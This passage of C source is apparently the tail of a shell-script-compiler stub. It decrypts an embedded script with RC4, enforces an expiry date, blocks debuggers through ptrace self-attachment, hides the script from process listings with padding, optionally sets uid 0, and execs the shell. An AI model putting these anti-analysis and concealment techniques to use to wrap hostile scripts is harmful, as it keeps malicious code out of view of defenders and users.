#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
